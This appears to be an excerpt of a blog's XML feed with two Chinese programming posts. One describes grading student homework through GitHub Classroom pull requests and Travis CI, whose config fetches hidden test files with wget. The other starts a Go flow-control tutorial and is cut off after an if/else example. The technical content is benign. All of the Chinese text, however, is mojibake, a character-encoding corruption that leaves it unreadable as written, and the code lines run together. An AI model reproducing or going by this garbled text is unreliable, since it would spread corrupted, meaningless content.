è€Œ Git èº«ç‚ºå·¥ç¨‹å¸«çš„å¿…å‚™æŠ€èƒ½ä¹‹ä¸€ï¼Œç”¨ Git ä¾†äº¤ä½œæ¥­ä¹Ÿæ˜¯åˆæƒ…åˆç†çš„ä¸€ä»¶äº‹ï¼Œå¯ä»¥å…ˆåŸ¹é¤Šå­¸ç”Ÿå€‘å° Git çš„ç†Ÿæ‚‰ç¨‹åº¦ã€‚
ä½†å•é¡Œä¾†äº†ï¼šè¦æ€éº¼ç”¨ Git äº¤ä½œæ¥­ï¼Ÿ
ä¹‹å‰æœ‰é–‹éå¦å¤–ä¸€å€‹å‰ç«¯çš„èª²ç¨‹ï¼Œé‚£æ™‚å€™æˆ‘æ¡å–çš„æ–¹å¼æ˜¯è®“å­¸ç”Ÿè‡ªå·±é–‹ä¸€å€‹ Github repo å¯«ä½œæ¥­ï¼Œä¸¦ä¸”è¨­ç½® Github pageï¼Œæ‰€ä»¥æˆ‘å¯ä»¥çœ‹åˆ°å­¸ç”Ÿçš„ source code è·Ÿç¶²é é¡¯ç¤ºå‡ºä¾†çš„çµæœã€‚
æ¥è‘—è‡ªå·±è¨­å®šå¥½ Issue templateï¼Œè¦å­¸ç”Ÿå¯«å®Œä½œæ¥­ä¹‹å¾Œé–‹ issue æäº¤ï¼Œå¦‚ä¸‹åœ–æ‰€ç¤ºï¼š

é€™æ¨£çš„å¥½è™•æ˜¯æˆ‘å¯ä»¥æŠŠä½œæ¥­éƒ½é›†ä¸­åœ¨åŒä¸€å€‹åœ°æ–¹ç®¡ç†ï¼Œå¯ä»¥å¾ˆæ–¹ä¾¿çœ‹å‡ºèª°äº¤äº†å“ªäº›ä½œæ¥­ï¼Œä»¥åŠæ¯å€‹ä½œæ¥­çš„ç‹€æ³ï¼š

ä½†ç¼ºé»ä¹Ÿå¾ˆæ˜é¡¯ï¼Œé‚£å°±æ˜¯èº«ç‚ºè€å¸«ï¼Œå…¶å¯¦å¾ˆé›£ã€Œæ”¹ä½œæ¥­ã€ï¼Œæ„æ€å°±æ˜¯å¦‚æœæˆ‘è¦æŒ‡æ­£å­¸ç”Ÿå€‘å“ªé‚Šå¯«éŒ¯äº†ï¼Œæˆ‘åªèƒ½åœ¨ issue è£¡é¢ç•™è¨€ï¼Œè¤‡è£½å®ƒæœ¬ä¾†çš„ç¨‹å¼ç¢¼ï¼Œç„¶å¾Œå‘Šè¨´ä»–æ€éº¼æ”¹æ‡‰è©²æœƒæ¯”è¼ƒå¥½ï¼š

æ•´é«”ä¾†èªªï¼Œå…¶å¯¦æ”¹ä½œæ¥­çš„é«”é©—é‚„ç®—ä¸éŒ¯ï¼Œæ²’ä»€éº¼å¤ªå¤§çš„å•é¡Œã€‚åªæ˜¯é€™æ¬¡æ—¢ç„¶é–‹å§‹äº†ä¸€å€‹å…¨æ–°çš„èª²ç¨‹ï¼Œå°±åœ¨æƒ³èªªæœ‰æ²’æœ‰æ›´å¥½çš„æ–¹æ³•å¯ä»¥å„ªåŒ–é€™å€‹æµç¨‹ã€‚
æ–°çš„äº¤ä½œæ¥­æµç¨‹æˆ‘åœ¨è¨­è¨ˆèª²ç¨‹çš„æ™‚å€™ï¼Œéƒ½æœƒå…ˆæ€è€ƒæˆ‘åœ¨å·¥ä½œä¸Šé‹ç”¨äº†å“ªäº›æ±è¥¿ï¼Œä¸¦ä¸”æŠŠæˆ‘è¦ºå¾—å¥½çš„ã€å¯ä»¥ç§»æ¤çš„åˆ¶åº¦æ¬åˆ°èª²ç¨‹ä¸Šï¼ŒèƒŒå¾Œçš„ç›®çš„æ˜¯å¸Œæœ›å…ˆè®“å­¸ç”Ÿç†è§£é€™äº›æ±è¥¿ï¼Œæ—¥å¾Œé€²å…¥è·å ´æ™‚å¯ä»¥ç„¡ç¸«æ¥è»Œã€‚
ä½†æœ‰æ™‚å€™æˆ‘ä¸æœƒè·Ÿä»–å€‘è¬›é€™æ˜¯ä½ ä»¥å¾Œå·¥ä½œæ™‚å¯èƒ½æœƒç¢°åˆ°çš„æµç¨‹ï¼ŒæœŸå¾…ä»–å€‘çœŸçš„ç¢°åˆ°æ™‚é©šå‘¼ï¼šã€Œå“‡ï¼ŒåŸä¾†æˆ‘åœ¨èª²ç¨‹è£¡é¢åšéçš„ç·´ç¿’å…¶å¯¦æ˜¯å·¥ä½œä¸Šæœƒç”¨åˆ°çš„æ±è¥¿ï¼ã€
èˆ‰ä¾‹ä¾†èªªï¼Œå› ç‚ºé€™æ¬¡æ–°çš„èª²ç¨‹æ˜¯è¦æ±‚å­¸ç”Ÿæ¯å¤©åƒèˆ‡ï¼Œåœ¨æˆ‘æ²’æœ‰ä¸Šèª²çš„æ™‚é–“è‡ªå­¸ï¼Œå‰›å¥½å…¬å¸æœ‰åœ¨è·‘ Scrumï¼Œæ¯å¤©æ—©ä¸Šéƒ½è¦é–‹ Stand-up meetingï¼Œä¸¦ä¸”åœ¨é–‹å§‹å‰å…ˆåœ¨ slack è£¡é¢é€å‡ºç°¡çŸ­çš„ noteï¼Œæˆ‘å°±æŠŠé€™å€‹åˆ¶åº¦å¼•å…¥åˆ°èª²ç¨‹ä¹‹ä¸­ã€‚
*æ˜¨å¤©*- å®Œæˆ git å®‰è£- è§£ codewar é¡Œç›®ï¼šOpposite number*ä»Šå¤©*- è§£ codewar é¡Œç›®ï¼šOpposite number- å¯«ä½œæ¥­ï¼šå¥½å¤šæ˜Ÿæ˜Ÿ

æ¯å¤©æˆ‘éƒ½æœƒè¦æ±‚å­¸ç”Ÿåœ¨ slack ç¾¤çµ„è£¡é¢ po æ˜¨å¤©è·Ÿä»Šå¤©åšçš„äº‹æƒ…ï¼Œé›–ç„¶è·Ÿå¯¦éš›çš„ Stand-up meeting é‚„æ˜¯ç›¸å·®è¨±å¤šï¼Œä½†è‡³å°‘åˆè¡·æ˜¯ä¸€æ¨£çš„ï¼šã€Œå¹«è‡ªå·±æ•´ç†é€²åº¦ã€è®“å¤§å®¶äº†è§£ä½ çš„é€²åº¦ã€ã€‚
ç§‰æŒè‘—ç›¸åŒçš„ç†å¿µï¼Œé€™æ¬¡çš„äº¤ä½œæ¥­æ©Ÿåˆ¶æˆ‘æ±ºå®šæ¡ç”¨ Github Flowã€‚
ä»€éº¼æ˜¯ Github Flowï¼Ÿå¯ä»¥å…ˆçœ‹ä¸€ä¸‹æˆ‘åœ¨å®˜ç¶²ä¸Šé¢æˆªçš„åœ–ï¼š

ç°¡å–®ä¾†èªªå°±æ˜¯å¦‚æœä½ è¦åšä»»ä½•æ”¹è®Šçš„è©±ï¼Œä½ è¦ follow ä»¥ä¸‹åŸå‰‡ï¼š

é–‹æ–°çš„ Branch
é€ Pull Request
ç­‰ Review
ç¢ºå®šæ²’å•é¡Œï¼Œmerge åˆ° master

æˆ‘å€‘å…¬å¸ä¹Ÿæ˜¯æ¡ç”¨é¡ä¼¼çš„å·¥ä½œæµç¨‹ï¼Œå› æ­¤æˆ‘è‡ªå·±æœ¬èº«å°é€™å€‹æµç¨‹æ»¿ç†Ÿæ‚‰çš„ã€‚è€Œé€™å€‹æµç¨‹çš„å¥½è™•æ˜¯ä»€éº¼ï¼Ÿå°±æ˜¯åœ¨é€ PR çš„æ™‚å€™ï¼Œä½ å¯ä»¥å¾ˆæ–¹ä¾¿åœ°çœ‹åˆ°æ”¹å‹•ä»¥åŠåŠ ä¸Šå»ºè­°ï¼š

é€™æ¨£çš„æ–¹å¼ï¼Œè±ˆä¸æ˜¯æœ€é©åˆæ‹¿ä¾†æ”¹ä½œæ¥­ï¼Ÿç›´æ¥åŠ ä¸Šè¨»è§£ï¼Œå¯ä»¥ä¸€è¡Œä¸€è¡Œä¿®æ­£ï¼Œåˆæ ¼çš„ä½œæ¥­å°±ç›´æ¥ approveï¼Œä¸åˆæ ¼çš„è¦æ±‚ä¿®æ­£ï¼Œç„¶å¾Œå†é€ä¸€æ¬¡ reviewã€‚
æ±ºå®šå¥½æ¡ç”¨ PR çš„æ–¹å¼äº¤ä½œæ¥­ä»¥å¾Œï¼Œå…¶å¯¦é‚„æœ‰ä¸€å€‹æ±è¥¿è¦æ±ºå®šï¼Œé‚£å°±æ˜¯è¦æ€éº¼é€ PRï¼Ÿæ„æ€æ˜¯èªªï¼ŒPR è¦åœ¨å“ªä¸€å€‹ repo åº•ä¸‹é–‹ï¼Ÿå¤§æ¦‚æœ‰ä»¥ä¸‹å¹¾ç¨®åšæ³•ï¼š

è€å¸«é–‹ä¸€å€‹ hw repoï¼Œé–‹æ¬Šé™çµ¦æ‰€æœ‰å­¸ç”Ÿï¼Œå­¸ç”Ÿå¯«å®Œä½œæ¥­ä»¥å¾Œå° hw é€ PR
å­¸ç”Ÿé–‹ä¸€å€‹ hw-student repoï¼ŒæŠŠè€å¸«åŠ æˆå”ä½œè€…ï¼Œå¯«å®Œä½œæ¥­é€ PR è®“è€å¸« review

å‰è€…çš„è©±ï¼Œä½ å¿…é ˆè¦åœ¨hwåº•ä¸‹é–‹ä¸åŒè³‡æ–™å¤¾ï¼Œé€™æ¨£æ¯å€‹å­¸ç”Ÿæ‰æœ‰åœ°æ–¹ä¾†æ”¾è‡ªå·±å¯«çš„ä½œæ¥­ã€‚å¥½è™•å¾ˆæ˜é¡¯ï¼Œå°±æ˜¯éƒ½é›†ä¸­åœ¨åŒä¸€å€‹åœ°æ–¹é€²è¡Œç®¡ç†ï¼Œä½†ç¼ºé»å°±æ˜¯é€™å€‹ repo æœƒè®Šå¾—å¾ˆå¤§ï¼Œå› ç‚ºä½ å¯èƒ½åŒæ™‚è¦æ”¾ 10 å€‹å­¸ç”Ÿå¯«çš„ä½œæ¥­ã€‚
å¾Œè€…çš„è©±ï¼Œå­¸ç”Ÿè‡ªå·±é–‹ repoï¼Œç„¶å¾ŒæŠŠè€å¸«åŠ é€²ä¾†è®“è€å¸«èƒ½ reviewï¼Œæ¯”ç¬¬ä¸€ç¨®åˆ†æ•£ï¼Œä½†æ˜¯è‡ªç”±åº¦é«˜å¾ˆå¤šï¼Œè€Œä¸”çµæ¥­ä»¥å¾Œï¼Œå­¸ç”Ÿå¯ä»¥ç›´æ¥æŠŠä»–çš„ repo ç•¶æˆä½œå“é›†çš„ä¸€éƒ¨åˆ†ã€‚é€™å…©ç¨®æ¯”èµ·ä¾†ï¼Œæˆ‘æ˜¯æ¯”è¼ƒåå¥½é€™å€‹çš„ã€‚
é™¤æ­¤ä¹‹å¤–ï¼Œå…¶å¯¦é‚„æœ‰å¦å¤–ä¸€å€‹å•é¡Œéœ€è¦è§£æ±ºï¼Œé‚£å°±æ˜¯æœ‰æ™‚å€™ä½œæ¥­æœ‰å›ºå®šæ ¼å¼éœ€è¦éµå®ˆï¼Œä¾‹å¦‚èªªæˆ‘æœ‰ä¸€äº›ç°¡ç­”é¡Œï¼Œå·²ç¶“åœ¨hwä¸‹é¢é–‹å¥½å›ç­”çš„æ¨¡æ¿ï¼Œå­¸ç”Ÿåªè¦ç…§è‘—æ ¼å¼å¯«ç­”æ¡ˆå°±å¥½ï¼Œé‚£å­¸ç”Ÿå°±å¿…é ˆè¤‡è£½é€™å€‹æ¨¡æ¿åˆ°è‡ªå·±çš„ repo åº•ä¸‹ï¼Œå…¶å¯¦ä¹Ÿæ˜¯æ»¿éº»ç…©çš„ã€‚
é‚£æ›´å¥½çš„æ–¹å¼æ˜¯ä»€éº¼ï¼Ÿ
å¾ˆç°¡å–®ï¼Œå°±æ˜¯çµåˆäº†å‰é¢å…©ç¨®ï¼š

è€å¸«é–‹ä¸€å€‹æ”¾ä½œæ¥­æ¨¡æ¿çš„ repoï¼Œå­¸ç”Ÿ fork é€™å€‹ repo åˆ°è‡ªå·±å¸³è™Ÿåº•ä¸‹ï¼Œä¸¦ä¸”åˆ©ç”¨é€™å€‹ fork çš„ repo äº¤ä½œæ¥­

é€™æ¨£å­å­¸ç”Ÿå°±ä¸ç”¨å¾é›¶é–‹å§‹ï¼Œå¯ä»¥ç›´æ¥æ¡ç”¨è€å¸«å·²ç¶“å¯«å¥½çš„äº¤ä½œæ¥­æ¨¡æ¿è·Ÿæ ¼å¼ï¼Œåªè¦ç…§è‘—åšå°±è¡Œäº†ã€‚è€Œé€™ç¨®è™•ç†æ–¹å¼ï¼Œå…¶å¯¦å°±æ˜¯æˆ‘å€‘ç­‰ç­‰æœƒæåˆ°çš„ Github Classroomã€‚
Github Classroomæˆ‘ä¸€é–‹å§‹çœ‹åˆ°é€™å€‹ï¼Œé‚„ä»¥ç‚ºæ˜¯ä»€éº¼ç¥å¥‡çš„ç³»çµ±ï¼Œå¯ä»¥è‡ªå‹•å¹«ä½ å®Œæˆä¸€å †è·Ÿæ”¹ä½œæ¥­æœ‰é—œçš„äº‹æƒ…ã€‚ä½†å¾ˆå¯æƒœï¼Œé€™ä¸¦ä¸æ˜¯ã€‚
Github Classroom çš„ç³»çµ±å¾ˆç°¡å–®ï¼Œé¦–å…ˆä½ è¦å…ˆè¨»å†Šä¸€å€‹ organization æ‰èƒ½ä½¿ç”¨ã€‚é€²å»ä¹‹å¾Œä½ å¯ä»¥å»ºç«‹ä¸€å€‹ Classroomï¼Œå°±æ˜¯ä¸€å ‚èª²çš„æ„æ€ã€‚
è€Œæ¯å ‚èª²åº•ä¸‹ï¼Œéƒ½æœ‰ä¸€å€‹åœ°æ–¹å¯ä»¥è®“ä½ æ–°å¢ä½œæ¥­ï¼Œåœ¨æ–°å¢ä½œæ¥­æ™‚ä½ å¯ä»¥é—œè¯è‡ªå·±å¸³è™Ÿåº•ä¸‹çš„ repoï¼Œä»‹é¢é•·é€™æ¨£ï¼š

è€Œé€™å€‹è¢«é—œè¯çš„ repoï¼Œå°±æ˜¯ä½ è¦æ‹¿ä¾†å‡ºä½œæ¥­çš„ repoï¼Œæ‰€ä»¥ä½ å¯ä»¥å…ˆæŠŠå¾ˆå¤šæ±è¥¿éƒ½å¯«å¥½ï¼Œä¾‹å¦‚èªªäº¤ä½œæ¥­çš„è¦å‰‡è·Ÿæ ¼å¼ä¹‹é¡çš„ã€‚åƒæˆ‘çš„è©±å°±æ˜¯æœƒå…ˆæŠŠæª”æ¡ˆé–‹å¥½ï¼Œå­¸ç”Ÿåªè¦åœ¨æŒ‡å®šçš„æª”æ¡ˆä¸‹é¢å¯«ç­”æ¡ˆå°±å¥½ï¼š

åœ¨æ–°å¢ä½œæ¥­ä¹‹å¾Œï¼Œæœƒæœ‰ä¸€å€‹è‡ªå‹•ç”¢ç”Ÿçš„ invitation linkï¼Œåªè¦å­¸ç”Ÿé»æ“Šä¸¦ä¸”åŠ å…¥ä¹‹å¾Œï¼Œå°±æœƒè‡ªå‹•åœ¨ä½ çš„ organization åº•ä¸‹ç”¢ç”Ÿæ–°çš„ repoã€‚
ä¾‹å¦‚èªªæˆ‘æ‹¿ä¾†é—œè¯çš„ repo å«åšmentor-programï¼Œå­¸ç”Ÿçš„å¸³è™Ÿæ˜¯ abcdï¼Œå°±æœƒç”¢ç”Ÿä¸€å€‹ mentor-program-abcdï¼Œè€Œé€™å€‹ repo å°±æ˜¯åŸºæ–¼ä½ åŸæœ¬çš„æ‰€ç”¢ç”Ÿçš„ï¼Œæ‰€ä»¥æ±è¥¿éƒ½ä¸€æ¨¡ä¸€æ¨£ã€‚ç”¢ç”Ÿä¹‹å¾Œå‘¢ï¼Œä»–æœƒè‡ªå‹•æŠŠå­¸ç”Ÿæœ¬äººè·Ÿè€å¸«è¨­ç‚ºå”ä½œè€…ï¼Œç„¶å¾Œå­¸ç”Ÿåªæœ‰ developer çš„æ¬Šé™ï¼Œè€å¸«å‰‡æ˜¯æœ‰ admin çš„æ¬Šé™ã€‚
æ‰€ä»¥èªªå‘¢ï¼Œç”¨äº† Github Classroom çš„å¥½è™•å°±æ˜¯æœ‰ä¸€å€‹è‡ªå‹•åŒ–çš„ç³»çµ±å¹«ä½  fork ä¸€ä»½ä½ çš„ repo çµ¦å­¸ç”Ÿï¼Œç„¶å¾Œè‡ªå‹•è¨­å®šæ¬Šé™ï¼Œä¸¦ä¸”åœ¨å¾Œå°å¯ä»¥çœ‹åˆ°æ¯å€‹å­¸ç”Ÿçš„ repoï¼š

åšåˆ°é€™è£¡ï¼Œä½ å°±æœ‰ä¸€å€‹å¾ˆä¸éŒ¯çš„æ”¹ä½œæ¥­ç³»çµ±äº†ï¼Œæµç¨‹éå¸¸ç°¡å–®ï¼š

å­¸ç”Ÿé€é Github Classroom ç”¢ç”Ÿçš„é€£çµåŠ å…¥
ç”¢ç”Ÿ mentor-progam-student_username çš„ repo
å­¸ç”Ÿ clone ä¸‹ä¾†ï¼Œé–‹æ–°çš„ branchï¼Œå¯«ä½œæ¥­
å¯«å®Œä½œæ¥­é€ PR
è€å¸« reviewï¼Œç¢ºèªæ²’å•é¡Œå† merge

çµåˆ CI è‡ªå‹•æ”¹ä½œæ¥­å‰›å‰›æœ‰èªªéï¼Œä½ å­¸ç”Ÿçš„ repo éƒ½æ˜¯ä»¥ä½ æä¾›çš„ç‚ºåŸºç¤ fork å‡ºå»çš„ï¼Œæ‰€ä»¥å­¸ç”Ÿå¯ä»¥æŒ‰ç…§ä½ è¨‚çš„è¦å‰‡ä¾†å¯«ä½œæ¥­ã€‚
èˆ‰æˆ‘å‰›å‰›æåˆ°çš„ä¾‹å­ï¼Œæˆ‘å°±å…ˆå¹«å­¸ç”Ÿé–‹å¥½hw1.jsã€hw2.jsâ€¦ä»–å€‘ç›´æ¥åœ¨æª”æ¡ˆè£¡é¢å¯«ç­”æ¡ˆå°±å¥½ã€‚å¦‚æœä½ æœ‰æ³¨æ„åˆ°çš„è©±ï¼Œæˆ‘é‚„å¹«ä»–å€‘é–‹äº†hw1.test.jsï¼Œæ‹¿ä¾†åš unit test ç”¨çš„ã€‚
åœ¨ç¬¬ä¸€é€±çš„ä½œæ¥­è£¡é¢ï¼Œä»–å€‘è¢«è¦æ±‚å¯¦ä½œå‡ºå¹¾å€‹ç°¡å–®çš„ functionï¼Œä¾‹å¦‚èªªåˆ¤æ–·è³ªæ•¸ã€åˆ¤æ–·å›æ–‡ç­‰ç­‰ã€‚æ‰€ä»¥æ¯å€‹ js è£¡é¢å°±åªæ˜¯ export å‡ºä¸€å€‹ function è€Œå·²ã€‚é‚£è¦æ€éº¼é©—è­‰å‘¢ï¼Ÿè·‘æ¸¬è©¦ï¼
æ—¢ç„¶æ˜¯é‚£éº¼ç°¡å–®çš„ä¸€äº› functionï¼Œé‚£å°±å¯ä»¥å¯« unit test ä¾†é©—è­‰çµæœæ˜¯å¦æ­£ç¢ºï¼Œè€Œé€™å€‹æ™‚å€™ï¼Œæˆ‘å°±æƒ³åˆ°å…¶å¯¦å¯ä»¥çµåˆ CI åšå‡ºè‡ªå‹•æ”¹ä½œæ¥­ç³»çµ±ã€‚
æµç¨‹å¾ˆç°¡å–®ï¼š

å­¸ç”Ÿé€ PR
ä¸²ä¸Š CIï¼Œåµæ¸¬åˆ°æœ‰ PR è‡ªå‹•è·‘ test
åœ¨ PR è£¡é¢é¡¯ç¤ºçµæœ

å®Œæˆå¾Œçš„çµæœæœƒåƒé€™æ¨£ï¼Œå¯ä»¥ç›´æ¥åœ¨ PR è£¡é¢çœ‹åˆ° CI è·‘æ¸¬è©¦ä¹‹å¾Œçš„çµæœï¼š

æˆ‘æ¡ç”¨çš„ç³»çµ±æ˜¯æœ‰åçš„Travis CIï¼Œå…¶å¯¦æ‡‰ç”¨ä¸Šä¹Ÿå¾ˆç°¡å–®ï¼Œç™»å…¥é€²å»ä¹‹å¾Œå®ƒæœƒè‡ªå‹•æŠ“ä½ çš„ repoï¼Œå°±å¯ä»¥çœ‹åˆ°ä¸€å€‹åˆ—è¡¨ï¼Œåªè¦æ‰“å‹¾å°±å¯ä»¥æŠŠ Travis è·Ÿ Github ä¸²èµ·ä¾†ï¼š

ä¸éåœ¨æ‰“å‹¾ä¹‹å‰ï¼Œä½ è¦å°ä½ çš„ repo åšä¸€äº›è¨­å®šã€‚å…¶å¯¦ CI çš„åŸç†å¾ˆç°¡å–®ï¼Œå°±æ˜¯ä½ æä¾›ä¸€äº›æŒ‡ä»¤è®“å®ƒå¹«ä½ è·‘ï¼Œä»¥æˆ‘çš„èª²ç¨‹ä¾†èªªï¼Œå°±æ˜¯è·‘npm run testè€Œå·²ã€‚
åªè¦åœ¨å°ˆæ¡ˆçš„æ ¹ç›®éŒ„åº•ä¸‹æ–°å¢.travis.ymlï¼Œå°±å¯ä»¥æŒ‡å®šä½ è¦è·‘çš„ç’°å¢ƒè·Ÿå…¶ä»–åƒæ•¸ï¼Œä»¥æˆ‘çš„å°ˆæ¡ˆç‚ºä¾‹ï¼š
language: node_jsnode_js:  - &quot;node&quot;cache: yarnbefore_script:   - wget $TESTCASE_URLnotifications:  email: false

Travis å¾ˆè°æ˜ï¼Œæ‰€ä»¥é è¨­å°±æœƒåŸ·è¡Œnpm run testï¼Œæ‰€ä»¥ä¸å¿…åœ¨é€™é‚Šè¨­å®šä»»ä½•æ±è¥¿ã€‚å¯ä»¥æ³¨æ„åˆ°çš„æ˜¯ï¼Œæˆ‘é€™é‚Šé¡å¤–è¨­å®šäº†before_script ï¼Œè€Œå¾Œé¢æ¥çš„åƒæ•¸å°±æ˜¯ä½ è¦åŸ·è¡Œçš„æŒ‡ä»¤ã€‚
æœƒé€™æ¨£è¨­å®šæ˜¯å› ç‚ºæˆ‘å¸Œæœ›åœ¨ repo è£¡é¢çš„ test æª”æ¡ˆå¯ä»¥è®“å­¸ç”Ÿè‡ªå·±ç·´ç¿’ï¼Œä»–å€‘è‡ªç”±ä¿®æ”¹ï¼Œè€Œæˆ‘çœŸæ­£æ‹¿ä¾†æ”¹ä½œæ¥­çš„ test æˆ‘æŠŠå®ƒæ”¾åœ¨é ç«¯äº†ï¼Œåœ¨è·‘ CI çš„æ™‚å€™æ‰æŠ“ä¸‹ä¾†ï¼Œç¢ºä¿å­¸ç”Ÿä¸å¯èƒ½æ”¹åˆ°ã€‚
æº–å‚™å®Œæˆä»¥å¾Œï¼Œä½ åªè¦å» CI çš„å¾Œå°æ‰“å‹¾ï¼Œä¸¦ä¸”é€²å»èª¿ä¸€äº›è¨­å®šï¼ˆä¾‹å¦‚èªªåªè¦å¹« PR è·‘æ¸¬è©¦ã€ç’°å¢ƒè®Šæ•¸çš„èª¿æ•´ç­‰ç­‰ï¼‰ï¼Œä¸€åˆ‡å°±å¤§åŠŸå‘Šæˆäº†ï¼

çµè«–çµåˆäº† Github Classroom è·Ÿ Travis CIï¼Œå°±èƒ½å¤ å¾ˆè¼•é¬†çš„æ‰“é€ å‡ºä¸€å€‹æ–¹ä¾¿è®“å­¸ç”Ÿäº¤ä½œæ¥­ï¼Œä¹Ÿè®“è€å¸«å¯ä»¥å¾ˆè¼•é¬†çš„æ‰¹æ”¹ä½œæ¥­ï¼Œç”šè‡³æ˜¯è®“ç³»çµ±è‡ªå‹•æ”¹ä½œæ¥­çš„æœå‹™ã€‚
å¦‚æœä½ æƒ³è¦æ›´é€²ä¸€æ­¥ï¼ŒCI é‚£ç«¯é‚„æœ‰å¾ˆå¤šå»¶ä¼¸æ‡‰ç”¨å¯ä»¥åšï¼Œä¾‹å¦‚èªªè·‘æ¸¬è©¦å¤±æ•—çš„è©±å°±è‡ªå‹•æŠŠ PR é—œæ‰ï¼Œæˆ–è€…æ˜¯è‡ªå‹•å›è¦†èªªå“ªä¸€å€‹ä½œæ¥­æ˜¯éŒ¯èª¤çš„ï¼Œç”šè‡³ä¹Ÿå¯ä»¥æŠŠé€™äº›è¨Šæ¯è¨˜èµ·ä¾†ï¼Œç›´æ¥åšä¸€å€‹å­¸ç”Ÿçš„ scoreboard ä¹‹é¡çš„ï¼Œæœ‰å¾ˆå¤šæœ‰è¶£çš„æ‡‰ç”¨å¯ä»¥ç©ã€‚
ä½†è‹¥æ˜¯ä½ åªæ˜¯æƒ³è¦åŸºæœ¬çš„æ±è¥¿ï¼Œåªè¦ç°¡å–®è¨­å®šä¸€ä¸‹å°±å¤ äº†ã€‚
é€™ä¸€ç¯‡æ•´ç†äº†æˆ‘æœ€è¿‘èª²ç¨‹çš„æ”¹ä½œæ¥­æµç¨‹ï¼Œç›®å‰å˜—è©¦èµ·ä¾†éƒ½è¦ºå¾—å¾ˆä¸éŒ¯ï¼Œä¸€ä¾†æ˜¯æˆ‘å¯ä»¥æ–¹ä¾¿æ”¹ä½œæ¥­ï¼ŒäºŒä¾†æ˜¯å¼·è¿«å­¸ç”Ÿç†Ÿæ‚‰ Git çš„æµç¨‹ï¼Œè€Œä¸”ä»–å€‘æœƒè¶Šä¾†è¶Šç†Ÿç·´ã€‚
å¦‚æœä½ æœ‰å“ªäº›æ›´å¥½çš„å»ºè­°ï¼Œæ­¡è¿åœ¨ä¸‹é¢ç•™è¨€ï¼Œæ–‡ä¸­å¦‚æœæœ‰éŒ¯ä¹Ÿéº»ç…©ä¸åæŒ‡å‡ºï¼Œæ„Ÿè¬ã€‚
é—œæ–¼ä½œè€…ï¼š@huli é‡ç”Ÿå·¥ç¨‹å¸«ï¼Œç›¸ä¿¡åˆ†äº«èˆ‡äº¤æµèƒ½è®“ä¸–ç•Œè®Šå¾—æ›´ç¾å¥½
]]></content>
      <tags>
        <tag>github</tag>
        <tag>github classroom</tag>
        <tag>travis</tag>
        <tag>ci</tag>
      </tags>
  </entry>
  <entry>
    <title>Go Web ç¨‹å¼è¨­è¨ˆå…¥é–€æ•™å­¸ï¼šèªæ³•åŸºç¤ä¹‹æµç¨‹æ§åˆ¶ï¼ˆflow controlï¼‰ç¯‡</title>
    <url>/2018/02/17/golang101-tutorial-basic-flow-control/</url>
    <content><![CDATA[
å‰è¨€ä¹‹å‰æˆ‘å€‘æ›¾ä»‹ç´¹äº†å¦‚ä½•å»ºç½® Go è®Šæ•¸å’Œè³‡æ–™å‹åˆ¥çš„ä½¿ç”¨ï¼Œæ¥ä¸‹ä¾†çš„å–®å…ƒæˆ‘å€‘å°‡é€é Golang Web ç¨‹å¼è¨­è¨ˆä¾†å­¸ç¿’ Go é€™å€‹ç¨‹å¼èªè¨€ã€‚è€Œåœ¨é€™å€‹å–®å…ƒä¸­æˆ‘å€‘å°‡ä»‹ç´¹ Go çš„æµç¨‹æ§åˆ¶çš„ä½¿ç”¨ã€‚ç¨‹å¼èªè¨€å”¯æœ‰å‹•æ‰‹ä½œæ‰èƒ½å­¸çš„å¥½ï¼Œä½ å¯ä»¥åƒè€ƒä¹‹å‰çš„æ–‡ç« å»ºç½®é–‹ç™¼ç’°å¢ƒæˆ–æ˜¯ä½¿ç”¨ç·šä¸Šé–‹ç™¼ç’°å¢ƒé€²è¡Œå­¸ç¿’ã€‚
æµç¨‹æ§åˆ¶ç°¡ä»‹ä¸€èˆ¬è€Œè¨€ï¼Œç¨‹å¼èªè¨€æ˜¯ç”±ä¸Šå¾€ä¸‹åŸ·è¡Œï¼Œè‹¥æˆ‘å€‘éœ€è¦ç¨‹å¼ä¾ç…§æˆ‘å€‘è¨­è¨ˆçš„é‚è¼¯æ–¹å‘åŸ·è¡Œå°±éœ€è¦æµç¨‹æ§åˆ¶çš„å”åŠ©ã€‚åœ¨é€™é‚Šä¸»è¦è«‡çš„æµç¨‹æ§åˆ¶æœ‰ä¸‰éƒ¨åˆ†ï¼šæ¢ä»¶åˆ¤æ–·ã€è¿´åœˆå¾ªç’°ã€è·³èºæ§åˆ¶ã€‚
æˆ‘å€‘ä½¿ç”¨åˆ¶åšèœè„¯è›‹é£Ÿè­œæ­¥é©Ÿä¾†è¬›è§£ç¯„ä¾‹ï¼š

æ”¾é»æ²¹
æ‰“è›‹
å¦‚æœå–œæ­¡è”¥èŠ±å¯ä»¥åŠ å…¥è”¥èŠ±ï¼Œå¦‚æœå–œæ­¡èœè„¯å¯ä»¥åŠ å…¥èœè„¯ï¼ˆç¨‹å¼è¡“èªï¼šif...else æ¢ä»¶åˆ¤æ–·ï¼‰
æ”¾å…¥å°‘è¨±é¹½å·´
ä¸­ç«å¿«ç‚’ï¼Œç¿»äº”æ¬¡é¢ï¼ˆç¨‹å¼è¡“èªï¼šfor è¿´åœˆï¼‰
ç•¶çœ‹åˆ°è›‹é¢å‘ˆç¾é‡‘é»ƒè‰²æ™‚å¯ä»¥èµ·é‹ï¼ŒçµæŸæ–™ç†ï¼ˆç¨‹å¼è¡“èªï¼šwhile è¿´åœˆï¼‰
å¥½åƒçš„è”¥èŠ±è›‹æˆ–èœè„¯è›‹ä¸Šæ¡Œ

é¦–å…ˆä»‹ç´¹ï¼Œæ¢ä»¶åˆ¤æ–·ï¼Œå¦‚æœ ifâ€¦ã€‚æ¢ä»¶åˆ¤æ–·æ˜¯ä¸€ç¨®é‚è¼¯åˆ¤æ–·ï¼Œç•¶ç¬¦åˆæ¢ä»¶å°±æ€éº¼æ¨£ï¼Œä¸ç¬¦åˆæ¢ä»¶å°±æ€éº¼æ¨£ã€‚

ifâ€¦else
 package mainimport &quot;fmt&quot;var taste = &quot;èœè„¯è›‹&quot; // å–œæ­¡èœè„¯è›‹if taste == &quot;èœè„¯è›‹&quot; &#123;    fmt.Println(&quot;åŠ å…¥èœè„¯&quot;)&#125; else &#123;    fmt.Println(&quot;åŠ å…¥è”¥èŠ±&quot;)&#125;

 Go èªè¨€ä¸­é™¤äº†æ¢ä»¶åˆ¤æ–·ä¸ç”¨åŠ  () å¤–ï¼Œä¹Ÿå¯ä»¥åœ¨æ¢ä»¶åˆ¤æ–·æ•˜è¿°å®£å‘Šè®Šæ•¸ï¼Œä½†åªæœƒå­˜æ´»æ–¼æ¢ä»¶é‚è¼¯å€å¡Šä½¿ç”¨ä¸Šã€‚
